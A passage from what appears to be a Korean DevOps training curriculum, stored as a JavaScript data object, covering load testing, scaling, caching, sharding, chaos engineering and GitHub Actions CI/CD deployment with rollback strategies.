# 결과: 평균 1200ms, 실패 5 ← 한계 근접

# Step 4: 동시 200명
ab -n 2000 -c 200 https://your-app.com/
# 결과: 평균 5000ms, 실패 150 ← 한계 초과!

# 결론: 동시 100~150명이 한계`},{heading:"5. 서버 리소스 모니터링",code:`# 테스트 중 서버 리소스 확인
# SSH로 서버 접속 후

# CPU, 메모리 실시간 확인
htop

# 또는
top

# 결과 분석:
CPU:  85% ← 높음
Mem:  3.2G/4G (80%) ← 높음
Load: 4.5, 3.8, 2.1 ← CPU 코어 수보다 높음 (위험)

# Docker 컨테이너별 리소스
docker stats

# 결과:
CONTAINER       CPU %    MEM USAGE
backend         65%      1.8GB ← 가장 높음 (병목!)
mysql           25%      800MB
redis           5%       100MB`},{heading:"6. 간단한 증설 계획",code:`# 현재 상황 분석
- 동시 접속 한계: 100~150명
- 병목: Backend 서버 (CPU 65%, 메모리 1.8GB)
- 목표: 500명 동시 접속

# 해결 방안
1. 수직 확장 (Scale Up)
   - 서버 스펙 업그레이드: 2코어 4GB → 4코어 8GB
   - 예상 효과: 300명까지 가능
   - 비용: 월 $40 → $80

2. 수평 확장 (Scale Out)
   - Backend 서버 2대로 증설 + Load Balancer
   - 예상 효과: 300~600명까지 가능
   - 비용: 월 $40 → $100 (서버 2대 + LB)

3. 최적화 (먼저 시도)
   - 느린 쿼리 개선 (인덱스 추가)
   - Redis 캐싱 도입
   - 예상 효과: 200~250명까지 개선
   - 비용: $0 (기존 인프라)`},{heading:"💡 초급 실습 과제",checklist:["Apache Bench로 메인 페이지 부하 테스트 (100명 동시 접속)","k6로 3단계 부하 테스트 (20→50→100명) 스크립트 작성 및 실행","동시 접속자를 단계별로 증가시켜 한계점 찾기","htop으로 테스트 중 CPU/메모리 사용률 확인","현재 시스템의 한계와 개선 방안 문서 작성 (1페이지)"]}]},intermediate:{title:"중급: 실전 부하 테스트와 CapRover 스케일링",sections:[{heading:"📚 학습 목표",content:"실제 사용자 패턴을 시뮬레이션하고, CapRover에서 앱을 스케일링할 수 있다."},{heading:"1. 실전 시나리오 부하 테스트",code:`// k6로 복잡한 사용자 시나리오 작성
import http from 'k6/http';
import { check, group, sleep } from 'k6';

export const options = {
  stages: [
    { duration: '2m', target: 100 },  // 2분간 100명까지 증가
    { duration: '5m', target: 100 },  // 5분간 100명 유지 (피크 타임)
    { duration: '2m', target: 200 },  // 2분간 200명까지 증가 (이벤트)
    { duration: '3m', target: 200 },  // 3분간 200명 유지
    { duration: '2m', target: 0 },    // 2분간 0명으로 감소
  ],
  thresholds: {
    http_req_duration: ['p(95)<1000', 'p(99)<2000'],
    http_req_failed: ['rate<0.05'],
    checks: ['rate>0.95'], // 95% 이상 성공
  },
};

export default function () {
  group('사용자 여정', function () {
    // 1. 홈 페이지 방문
    let res = http.get('https://your-app.com/');
    check(res, { '홈 로딩 성공': (r) => r.status === 200 });
    sleep(2);

    // 2. 상품 목록 조회
    res = http.get('https://your-app.com/api/products');
    check(res, {
      '상품 목록 성공': (r) => r.status === 200,
      '상품 10개 이상': (r) => JSON.parse(r.body).length >= 10,
    });
    sleep(3);

    // 3. 상품 상세 조회 (무작위)
    const productId = Math.floor(Math.random() * 100) + 1;
    res = http.get(\`https://your-app.com/api/products/\${productId}\`);
    check(res, { '상세 조회 성공': (r) => r.status === 200 });
    sleep(5);

    // 4. 장바구니 추가 (10%만 실행)
    if (Math.random() < 0.1) {
      res = http.post('https://your-app.com/api/cart', JSON.stringify({
        productId: productId,
        quantity: 1
      }), {
        headers: { 'Content-Type': 'application/json' }
      });
      check(res, { '장바구니 추가 성공': (r) => r.status === 201 });
    }

    sleep(1);
  });
}

// 실행 및 결과 분석
k6 run --out json=results.json load-test.js

// 결과:
     ✓ 홈 로딩 성공.............: 99.8%
     ✓ 상품 목록 성공...........: 98.5%
     ✓ 상품 10개 이상...........: 98.5%
     ✓ 상세 조회 성공...........: 95.2% ← 피크 때 실패율 증가
     ✓ 장바구니 추가 성공.......: 92.1% ← 가장 낮음

     http_req_duration..........: avg=680ms p(95)=1.2s p(99)=2.5s ← p99 초과!`},{heading:"2. CapRover에서 앱 스케일링",steps:[{label:"수동 스케일링",code:`# CapRover 대시보드
1. Apps 메뉴 → 앱 선택
2. "App Configs" 탭
3. "Instance Count" 섹션
   - 현재: 1
   - 변경: 3 (3개 인스턴스)
4. "Save & Update" 클릭

# 결과:
- 3개의 컨테이너가 실행됨
- CapRover가 자동으로 Load Balancing
- 트래픽이 3개에 분산됨

# 확인
docker ps | grep app-name
# app-name.1  (포트 32771)
# app-name.2  (포트 32772)
# app-name.3  (포트 32773)

# 부하 테스트 재실행
ab -n 1000 -c 200 https://your-app.com/
# 개선:
# Before: Requests/sec: 50, Time/req: 4000ms
# After:  Requests/sec: 140, Time/req: 1400ms (280% 향상!)`},{label:"Docker Compose로 스케일링",code:`# docker-compose.yml
version: '3.8'
services:
  app:
    image: myapp:latest
    deploy:
      replicas: 3 # 3개 인스턴스
      resources:
        limits:
          cpus: '1'
          memory: 512M
        reservations:
          cpus: '0.5'
          memory: 256M
    environment:
      NODE_ENV: production

  nginx:
    image: nginx:alpine
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - app

# nginx.conf (로드 밸런서)
upstream backend {
  server app:3000;
  # Docker Compose가 자동으로 3개 인스턴스에 분산
}

server {
  listen 80;
  location / {
    proxy_pass http://backend;
    proxy_set_header Host $host;
  }
}

# 실행
docker-compose up --scale app=3`}]},{heading:"3. 데이터베이스 병목 해결",code:`// 문제: DB 연결 수 부족
// Error: ER_TOO_MANY_CONNECTIONS

// 해결 1: Connection Pooling 최적화
const mysql = require('mysql2/promise');

const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'mydb',
  waitForConnections: true,
  connectionLimit: 50, // 10 → 50으로 증가
  queueLimit: 0,
  enableKeepAlive: true,
  keepAliveInitialDelay: 10000
});

// 해결 2: Read Replica 사용
const masterPool = mysql.createPool({
  host: 'mysql-master.example.com',
  // ... (쓰기 전용)
});

const replicaPool = mysql.createPool({
  host: 'mysql-replica.example.com',
  // ... (읽기 전용)
});

app.get('/api/products', async (req, res) => {
  // 읽기는 Replica에서
  const [products] = await replicaPool.query('SELECT * FROM products');
  res.json(products);
});

app.post('/api/products', async (req, res) => {
  // 쓰기는 Master에서
  await masterPool.query('INSERT INTO products ...', [...]);
  res.json({ success: true });
});

// 해결 3: 쿼리 캐싱
const cache = new Map();

app.get('/api/products', async (req, res) => {
  const cacheKey = 'products:all';

  if (cache.has(cacheKey)) {
    return res.json(cache.get(cacheKey));
  }

  const [products] = await pool.query('SELECT * FROM products');
  cache.set(cacheKey, products);

  // 5분 후 캐시 삭제
  setTimeout(() => cache.delete(cacheKey), 5 * 60 * 1000);

  res.json(products);
});`},{heading:"4. CDN과 정적 파일 분리",code:`// 문제: 이미지/CSS/JS 요청이 서버 부하 증가

// 해결: Cloudflare CDN 사용
// 1. Cloudflare 계정 생성
// 2. 도메인 추가
// 3. 네임서버 변경

// 정적 파일 캐싱 규칙
// Cloudflare 대시보드 → Page Rules
// URL: *your-app.com/assets/*
// Settings:
//   - Cache Level: Cache Everything
//   - Edge Cache TTL: 1 month
//   - Browser Cache TTL: 1 year

// Express에서 정적 파일 분리
app.use('/assets', express.static('public', {
  maxAge: '1y',
  immutable: true,
  setHeaders: (res, path) => {
    res.set('Access-Control-Allow-Origin', '*');
  }
}));

// HTML에서 CDN URL 사용
<link rel="stylesheet" href="https://cdn.your-app.com/assets/style.css">
<img src="https://cdn.your-app.com/assets/logo.png">

// 효과:
// Before: 서버가 모든 요청 처리 (이미지/CSS/JS 포함)
// After: CDN이 정적 파일 처리 → 서버 부하 70% 감소`},{heading:"5. 자동 스케일링 (Auto Scaling) 개념",code:`// Kubernetes HPA (Horizontal Pod Autoscaler) 예시
// hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: myapp-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  minReplicas: 2
  maxReplicas: 10
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70 # CPU 70% 시 스케일 아웃

# 적용
kubectl apply -f hpa.yaml

# 동작 원리:
# 1. CPU 사용률이 70% 초과 → 파드 추가
# 2. CPU 사용률이 50% 미만 → 파드 감소
# 3. 최소 2개, 최대 10개 유지

# AWS ECS Auto Scaling 예시
aws application-autoscaling register-scalable-target \\
  --service-namespace ecs \\
  --scalable-dimension ecs:service:DesiredCount \\
  --resource-id service/my-cluster/my-service \\
  --min-capacity 2 \\
  --max-capacity 10

aws application-autoscaling put-scaling-policy \\
  --policy-name cpu-scaling \\
  --service-namespace ecs \\
  --scalable-dimension ecs:service:DesiredCount \\
  --resource-id service/my-cluster/my-service \\
  --policy-type TargetTrackingScaling \\
  --target-tracking-scaling-policy-configuration file://config.json

# config.json
{
  "TargetValue": 70.0,
  "PredefinedMetricSpecification": {
    "PredefinedMetricType": "ECSServiceAverageCPUUtilization"
  }
}`},{heading:"⚡ 중급 실습 과제",checklist:["k6로 실제 사용자 여정 시나리오 작성 후 15분간 부하 테스트","CapRover에서 앱 인스턴스를 1개 → 3개로 증가 후 성능 비교","MySQL Connection Pool 크기 조정 후 동시 접속 한계 재측정","Cloudflare CDN 연결 후 정적 파일 응답 시간 90% 이상 개선","CPU 70% 도달 시 자동 스케일링 규칙 설정 (CapRover 또는 K8s)"]}]},advanced:{title:"고급: 대규모 트래픽 대비 아키텍처 설계",sections:[{heading:"📚 학습 목표",content:"수백만 사용자를 처리할 수 있는 확장 가능한 아키텍처를 설계하고 구현할 수 있다."},{heading:"1. 분산 부하 테스트 (Distributed Load Testing)",code:`// k6 Cloud로 전 세계 다중 위치 테스트
k6 cloud run load-test.js

// 또는 Grafana k6 Cloud 설정
export const options = {
  cloud: {
    name: 'Global Load Test',
    projectID: 12345,
    distribution: {
      'amazon:us:ashburn': { loadZone: 'amazon:us:ashburn', percent: 40 },
      'amazon:ie:dublin': { loadZone: 'amazon:ie:dublin', percent: 30 },
      'amazon:jp:tokyo': { loadZone: 'amazon:jp:tokyo', percent: 30 },
    },
  },
  stages: [
    { duration: '5m', target: 10000 }, // 1만 명까지
  ],
};

// Locust로 분산 테스트 (Python)
# locustfile.py
from locust import HttpUser, task, between

class WebsiteUser(HttpUser):
    wait_time = between(1, 3)

    @task(3)
    def view_products(self):
        self.client.get("/api/products")

    @task(1)
    def view_product_detail(self):
        product_id = random.randint(1, 100)
        self.client.get(f"/api/products/{product_id}")

# Master 서버에서 실행
locust -f locustfile.py --master

# Worker 서버 3대에서 실행
locust -f locustfile.py --worker --master-host=<master-ip>

# 웹 UI에서 테스트 시작: http://localhost:8089
# 목표: 10만 명 동시 사용자`},{heading:"2. 멀티 리전 배포 아키텍처",code:`# AWS Global Accelerator + CloudFront
# architecture.yml
Resources:
  # 1. 멀티 리전 배포
  USEastApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # us-east-1 리전

  EUWestApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # eu-west-1 리전

  APNortheastApp:
    Type: AWS::ECS::Service
    Properties:
      Cluster: !Ref ECSCluster
      # ap-northeast-1 리전

  # 2. Global Accelerator (지연 시간 기반 라우팅)
  GlobalAccelerator:
    Type: AWS::GlobalAccelerator::Accelerator
    Properties:
      IpAddressType: IPV4

  # 3. CloudFront (정적 파일 + 동적 콘텐츠)
  CDN:
    Type: AWS::CloudFront::Distribution
    Properties:
      Origins:
        - DomainName: api.example.com
          OriginPath: /api
          CustomOriginConfig:
            OriginProtocolPolicy: https-only

# Geo-DNS with Route 53
resource "aws_route53_record" "www" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "www"
  type    = "A"

  geolocation_routing_policy {
    continent = "NA" # 북미 → us-east-1
  }

  alias {
    name                   = aws_lb.us_east.dns_name
    zone_id                = aws_lb.us_east.zone_id
    evaluate_target_health = true
  }
}

# 효과:
# - 한국 사용자 → 서울 리전 (지연 50ms)
# - 미국 사용자 → 버지니아 리전 (지연 30ms)
# - 유럽 사용자 → 아일랜드 리전 (지연 40ms)`},{heading:"3. Database Sharding (샤딩)",content:"데이터를 여러 데이터베이스로 분산하여 처리량 향상:",code:`// 사용자 ID 기반 샤딩
const shards = [
  mysql.createPool({ host: 'db-shard-1.example.com' }), // shard 0
  mysql.createPool({ host: 'db-shard-2.example.com' }), // shard 1
  mysql.createPool({ host: 'db-shard-3.example.com' }), // shard 2
  mysql.createPool({ host: 'db-shard-4.example.com' }), // shard 3
];

function getShardForUser(userId) {
  return shards[userId % shards.length];
}

app.get('/api/users/:userId', async (req, res) => {
  const userId = parseInt(req.params.userId);
  const shard = getShardForUser(userId);

  const [users] = await shard.query(
    'SELECT * FROM users WHERE id = ?',
    [userId]
  );

  res.json(users[0]);
});

// 예시:
// userId = 1 → shard 1 (1 % 4 = 1)
// userId = 5 → shard 1 (5 % 4 = 1)
// userId = 8 → shard 0 (8 % 4 = 0)

// 샤드 간 조인 방지 (비정규화)
// Bad: 샤드 A의 users와 샤드 B의 orders 조인 불가
// Good: orders 테이블에 user_name 컬럼 추가 (중복 허용)

// 샤드 리밸런싱 (샤드 추가 시)
async function rebalanceShards(newShardCount) {
  // 1. 새 샤드 추가
  const newShards = [...shards];
  for (let i = shards.length; i < newShardCount; i++) {
    newShards.push(mysql.createPool({
      host: \`db-shard-\${i + 1}.example.com\`
    }));
  }

  // 2. 데이터 재배치 (점진적으로)
  // 일부 사용자를 새 샤드로 이동
}`},{heading:"4. 캐시 전략 고도화",code:`// 다층 캐싱 (Multi-tier Caching)
// L1: 애플리케이션 메모리 (빠름, 작음)
// L2: Redis (중간, 큼)
// L3: CDN (느림, 매우 큼)

const NodeCache = require('node-cache');
const Redis = require('ioredis');

const l1Cache = new NodeCache({ stdTTL: 60 }); // 1분
const l2Cache = new Redis();

app.get('/api/products/:id', async (req, res) => {
  const productId = req.params.id;

  // L1 캐시 확인
  let product = l1Cache.get(\`product:\${productId}\`);
  if (product) {
    return res.json({ product, source: 'L1-memory' });
  }

  // L2 캐시 확인
  product = await l2Cache.get(\`product:\${productId}\`);
  if (product) {
    l1Cache.set(\`product:\${productId}\`, JSON.parse(product));
    return res.json({ product: JSON.parse(product), source: 'L2-redis' });
  }

  // DB 조회
  [product] = await db.query('SELECT * FROM products WHERE id = ?', [productId]);

  // 캐시 저장
  l1Cache.set(\`product:\${productId}\`, product);
  await l2Cache.setex(\`product:\${productId}\`, 3600, JSON.stringify(product)); // 1시간

  res.json({ product, source: 'DB' });
});

// Cache Stampede 방지 (동시 캐시 미스)
const locks = new Map();

async function getProductWithLock(productId) {
  const lockKey = \`lock:product:\${productId}\`;

  // 잠금 확인
  if (locks.has(lockKey)) {
    // 다른 요청이 이미 DB 조회 중 → 대기
    await locks.get(lockKey);
    return l2Cache.get(\`product:\${productId}\`);
  }

  // 잠금 설정
  const promise = db.query('SELECT * FROM products WHERE id = ?', [productId])
    .then(async ([product]) => {
      await l2Cache.setex(\`product:\${productId}\`, 3600, JSON.stringify(product));
      locks.delete(lockKey);
      return product;
    });

  locks.set(lockKey, promise);
  return promise;
}`},{heading:"5. Circuit Breaker 패턴",content:"장애가 발생한 서비스로의 요청을 차단하여 연쇄 장애 방지:",code:`const CircuitBreaker = require('opossum');

// 외부 API 호출
async function callExternalAPI(data) {
  const response = await fetch('https://external-api.com/data', {
    method: 'POST',
    body: JSON.stringify(data),
    timeout: 3000
  });
  return response.json();
}

// Circuit Breaker 설정
const breaker = new CircuitBreaker(callExternalAPI, {
  timeout: 3000, // 3초 타임아웃
  errorThresholdPercentage: 50, // 50% 실패 시
  resetTimeout: 30000, // 30초 후 재시도
  volumeThreshold: 10 // 최소 10개 요청 필요
});

// 상태 모니터링
breaker.on('open', () => {
  console.log('Circuit breaker opened - stopping requests');
});

breaker.on('halfOpen', () => {
  console.log('Circuit breaker half-open - testing');
});

breaker.on('close', () => {
  console.log('Circuit breaker closed - normal operation');
});

// 사용
app.post('/api/process', async (req, res) => {
  try {
    const result = await breaker.fire(req.body);
    res.json(result);
  } catch (err) {
    if (err.message === 'Breaker is open') {
      // Fallback 응답
      res.json({
        error: 'Service temporarily unavailable',
        fallback: true
      });
    } else {
      res.status(500).json({ error: err.message });
    }
  }
});

// 동작:
// 1. 정상: 모든 요청 통과
// 2. 50% 실패: Circuit Open (모든 요청 차단)
// 3. 30초 후: Half-Open (테스트 요청 1개)
// 4. 성공: Circuit Close (정상화)
// 5. 실패: 다시 Open (30초 대기)`},{heading:"6. Chaos Engineering (카오스 엔지니어링)",code:`# Chaos Monkey (Netflix) - 무작위 서버 종료 시뮬레이션
# chaos.sh
#!/bin/bash

while true; do
  # 30% 확률로 랜덤 컨테이너 종료
  if [ $((RANDOM % 10)) -lt 3 ]; then
    CONTAINER=$(docker ps -q | shuf -n 1)
    echo "Killing container: $CONTAINER"
    docker kill $CONTAINER
  fi

  sleep 300 # 5분마다
done

# Litmus Chaos (Kubernetes)
# pod-delete-chaos.yaml
apiVersion: litmuschaos.io/v1alpha1
kind: ChaosEngine
metadata:
  name: pod-delete-chaos
spec:
  engineState: 'active'
  chaosServiceAccount: pod-delete-sa
  experiments:
  - name: pod-delete
    spec:
      components:
        env:
        - name: TOTAL_CHAOS_DURATION
          value: '60'
        - name: CHAOS_INTERVAL
          value: '10'
        - name: FORCE
          value: 'false'

# 적용
kubectl apply -f pod-delete-chaos.yaml

# 테스트 시나리오:
# 1. 피크 타임에 무작위 파드 삭제
# 2. 애플리케이션이 자동 복구되는지 확인
# 3. 사용자 경험에 영향이 없는지 모니터링

# 네트워크 지연 주입
tc qdisc add dev eth0 root netem delay 200ms 50ms
# 200ms ± 50ms 지연 추가

# 패킷 손실 주입
tc qdisc change dev eth0 root netem loss 10%
# 10% 패킷 손실`},{heading:"⚡ 고급 실습 과제",checklist:["k6 Cloud로 전 세계 3개 지역에서 동시 부하 테스트 (총 1만 사용자)","사용자 ID 기반 DB 샤딩 구현 후 처리량 3배 이상 향상 확인","다층 캐싱 (메모리 + Redis + CDN) 구현 후 캐시 히트율 90% 이상 달성","Circuit Breaker로 외부 API 장애 시 자동 차단 및 Fallback 응답","Chaos Monkey로 무작위 서버 종료 시뮬레이션 후 자동 복구 확인"]}]}}}]},{id:"tier4",name:"Tier 4: 고급 운영 기술",period:"진행형",color:"bg-blue-100 border-blue-300 text-blue-800",reason:"더 전문적이고 효율적인 운영을 위해",topics:[{id:"4-1",name:"CI/CD와 배포 자동화",goal:"안전하고 빠르게 배포할 수 있다",hours:15,keywords:["CI/CD","Git workflow","automated deployment"],tasks:["GitHub Actions 워크플로우 작성","자동 테스트 설정","Blue-Green 배포 구현"],content:{beginner:{title:"초급: CI/CD 개념과 GitHub Actions 기본",sections:[{heading:"📚 학습 목표",content:"CI/CD가 무엇인지 이해하고, GitHub Actions로 간단한 자동화 파이프라인을 만들 수 있다."},{heading:"1. CI/CD가 왜 필요한가?",content:"수동 배포의 문제점과 자동화의 이점을 이해합니다.",list:["수동 배포: 개발자가 서버 SSH 접속 → git pull → npm install → pm2 restart (10분 소요, 실수 가능)","자동 배포: git push만 하면 자동으로 테스트 → 빌드 → 배포 (2분 소요, 실수 없음)","빠른 피드백: 코드 푸시 후 5분 안에 배포 완료 또는 실패 알림","안정성: 테스트 실패 시 자동으로 배포 중단"]},{heading:"2. CI와 CD의 차이",code:`# CI (Continuous Integration) - 지속적 통합
- 개발자가 코드를 push할 때마다:
  1. 코드 린팅 (문법 체크)
  2. 유닛 테스트 실행
  3. 빌드 성공 확인
- 목표: 버그를 빠르게 발견

# CD (Continuous Deployment) - 지속적 배포
- CI가 성공하면:
  1. 빌드된 결과물을 서버에 배포
  2. 서비스 재시작
  3. 헬스 체크
- 목표: 사용자에게 빠르게 전달

# 전체 흐름:
git push → CI (테스트) → CD (배포) → 사용자에게 도달`},{heading:"3. GitHub Actions 첫 워크플로우",steps:[{label:"기본 구조",code:`# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test

      - name: Build
        run: npm run build`},{label:"동작 확인",code:`# 1. 위 파일을 Git에 커밋
git add .github/workflows/ci.yml
git commit -m "Add CI workflow"
git push

# 2. GitHub 웹사이트에서 확인
# Repository → Actions 탭
# 워크플로우 실행 상태 확인

# 3. 결과:
✓ Checkout code (1s)
✓ Setup Node.js (3s)
✓ Install dependencies (15s)
✓ Run tests (5s)
✓ Build (8s)

Total: 32s`}]},{heading:"4. 자동 배포 추가",code:`# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Deploy to server
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.SERVER_HOST }}
          username: \${{ secrets.SERVER_USER }}
          key: \${{ secrets.SSH_PRIVATE_KEY }}
          script: |
            cd /var/www/myapp
            git pull origin main
            npm install
            npm run build
            pm2 restart myapp

# GitHub Secrets 설정:
# Repository → Settings → Secrets and variables → Actions
# - SERVER_HOST: your-server-ip
# - SERVER_USER: root
# - SSH_PRIVATE_KEY: (복사한 SSH 키)`},{heading:"5. 실패 시 알림 받기",code:`# Slack 알림 추가
- name: Notify Slack on failure
  if: failure()
  uses: slackapi/slack-github-action@v1
  with:
    payload: |
      {
        "text": "❌ Deployment failed for \${{ github.repository }}",
        "blocks": [
          {
            "type": "section",
            "text": {
              "type": "mrkdwn",
              "text": "Commit: \${{ github.sha }}\\nAuthor: \${{ github.actor }}"
            }
          }
        ]
      }
  env:
    SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}

# Slack Webhook 설정:
# 1. Slack에서 Incoming Webhooks 앱 추가
# 2. Webhook URL 복사
# 3. GitHub Secrets에 SLACK_WEBHOOK 추가`},{heading:"6. 환경별 배포 (Staging/Production)",code:`# .github/workflows/deploy-staging.yml
name: Deploy to Staging

on:
  push:
    branches: [develop]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # ... (빌드 단계)
      - name: Deploy to Staging
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.STAGING_HOST }}
          script: |
            cd /var/www/myapp-staging
            git pull origin develop
            # ...

# .github/workflows/deploy-production.yml
name: Deploy to Production

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production # 수동 승인 필요
    steps:
      # ... (빌드 단계)
      - name: Deploy to Production
        uses: appleboy/ssh-action@master
        with:
          host: \${{ secrets.PROD_HOST }}
          script: |
            cd /var/www/myapp
            git pull origin main
            # ...

# 환경 보호 설정:
# Repository → Settings → Environments → New environment
# Name: production
# Required reviewers: (팀원 선택)
# → main 브랜치 push 시 수동 승인 후 배포`},{heading:"💡 초급 실습 과제",checklist:["GitHub Actions로 CI 워크플로우 작성 (테스트 + 빌드)","테스트 실패 시 워크플로우가 중단되는지 확인","자동 배포 워크플로우 추가하여 main 브랜치 push 시 서버 배포","Slack 알림 설정하여 배포 실패 시 알림 수신","Staging과 Production 환경 분리하여 각각 자동 배포"]}]},intermediate:{title:"중급: 고급 배포 전략과 롤백",sections:[{heading:"📚 학습 목표",content:"Blue-Green 배포, Canary 배포 등 고급 배포 전략을 이해하고 구현할 수 있다."},{heading:"1. Blue-Green 배포",content:"두 개의 동일한 환경을 준비하여 무중단 배포를 구현합니다.",code:`# docker-compose.yml
version: '3.8'
services:
  app-blue:
    image: myapp:blue
    container_name: app-blue
    ports:
      - "3001:3000"
    environment:
      - COLOR=blue

  app-green:
    image: myapp:green
    container_name: app-green
    ports:
      - "3002:3000"
    environment:
      - COLOR=green

  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf

# nginx.conf
upstream backend {
  server app-blue:3000;  # 현재 활성화된 환경
  # server app-green:3000;
}

server {
  listen 80;
  location / {
    proxy_pass http://backend;
  }
}

# 배포 스크립트
#!/bin/bash
# deploy-blue-green.sh

CURRENT=$(curl -s http://localhost/api/version | jq -r '.env')

if [ "$CURRENT" == "blue" ]; then
  # Green에 새 버전 배포
  docker-compose up -d app-green
  sleep 5  # 헬스 체크 대기

  # 헬스 체크
  if curl -f http://localhost:3002/health; then
    # Nginx 설정 변경 (blue → green)
    sed -i 's/app-blue/app-green/' nginx.conf
    docker-compose restart nginx

    echo "Switched to green"
    # Blue 환경 정리
    docker-compose stop app-blue
  else
    echo "Health check failed, rollback"
    docker-compose stop app-green
  fi
else
  # Blue에 새 버전 배포 (동일한 로직)
  # ...
fi`},{heading:"2. Canary 배포 (점진적 배포)",code:`# nginx.conf (가중치 기반 라우팅)
upstream backend {
  server app-v1:3000 weight=9;  # 90% 트래픽
  server app-v2:3000 weight=1;  # 10% 트래픽
}

# 단계별 증가
# Step 1: 10% → weight=1
# Step 2: 25% → weight=3
# Step 3: 50% → weight=5
# Step 4: 100% → weight=10 (v1 제거)

# GitHub Actions 워크플로우
name: Canary Deployment

on:
  workflow_dispatch:
    inputs:
      traffic_percentage:
        description: 'Traffic percentage for new version'
        required: true
        default: '10'

jobs:
  canary-deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy new version
        run: |
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            docker-compose up -d app-v2

            # Nginx 가중치 변경
            WEIGHT=\${{ github.event.inputs.traffic_percentage }}
            OLD_WEIGHT=$((100 - WEIGHT))

            sed -i "s/weight=.* # v1/weight=$OLD_WEIGHT # v1/" nginx.conf
            sed -i "s/weight=.* # v2/weight=$WEIGHT # v2/" nginx.conf

            docker-compose restart nginx
          EOF

      - name: Monitor metrics
        run: |
          sleep 300  # 5분 모니터링

          ERROR_RATE=$(curl -s https://your-app.com/metrics | jq '.error_rate')

          if (( $(echo "$ERROR_RATE > 0.05" | bc -l) )); then
            echo "Error rate too high, rolling back"
            ssh ... << 'EOF'
              sed -i "s/weight=.* # v1/weight=100 # v1/" nginx.conf
              sed -i "s/weight=.* # v2/weight=0 # v2/" nginx.conf
              docker-compose restart nginx
            EOF
            exit 1
          fi`},{heading:"3. 자동 롤백 시스템",code:`# .github/workflows/deploy-with-rollback.yml
name: Deploy with Auto Rollback

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Get current version
        id: current
        run: |
          CURRENT=$(ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} 'cat /var/www/myapp/VERSION')
          echo "version=$CURRENT" >> $GITHUB_OUTPUT

      - name: Deploy new version
        run: |
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            cd /var/www/myapp
            git pull origin main
            npm install
            npm run build
            echo "\${{ github.sha }}" > VERSION
            pm2 restart myapp
          EOF

      - name: Health check
        id: health
        run: |
          sleep 10
          for i in {1..5}; do
            if curl -f https://your-app.com/health; then
              echo "healthy=true" >> $GITHUB_OUTPUT
              exit 0
            fi
            sleep 5
          done
          echo "healthy=false" >> $GITHUB_OUTPUT

      - name: Rollback on failure
        if: steps.health.outputs.healthy != 'true'
        run: |
          echo "Health check failed, rolling back to \${{ steps.current.outputs.version }}"
          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
            cd /var/www/myapp
            git checkout \${{ steps.current.outputs.version }}
            npm install
            npm run build
            pm2 restart myapp
          EOF

      - name: Notify
        if: always()
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "\${{ job.status == 'success' && '✅' || '❌' }} Deployment \${{ job.status }}",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "Commit: \${{ github.sha }}\\nHealth: \${{ steps.health.outputs.healthy }}"
                  }
                }
              ]
            }
        env:
          SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}`},{heading:"4. Docker 이미지 버전 관리",code:`# .github/workflows/build-and-push.yml
name: Build and Push Docker Image

on:
  push:
    branches: [main]
    tags:
      - 'v*'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Login to Docker Hub
        uses: docker/login-action@v2
        with:
          username: \${{ secrets.DOCKER_USERNAME }}
          password: \${{ secrets.DOCKER_PASSWORD }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v4
        with:
          images: myusername/myapp
          tags: |
            type=ref,event=branch
            type=semver,pattern={{version}}
            type=sha

      - name: Build and push
        uses: docker/build-push-action@v4
        with:
          context: .
          push: true
          tags: \${{ steps.meta.outputs.tags }}
          labels: \${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

# 결과:
# main 브랜치 push → myapp:main
# v1.2.3 태그 → myapp:v1.2.3, myapp:1.2, myapp:1
# git sha abc123 → myapp:sha-abc123`},{heading:"5. 데이터베이스 마이그레이션 자동화",code:`# .github/workflows/deploy-with-migration.yml
- name: Run database migrations
  run: |
    ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
      cd /var/www/myapp

      # 백업 먼저
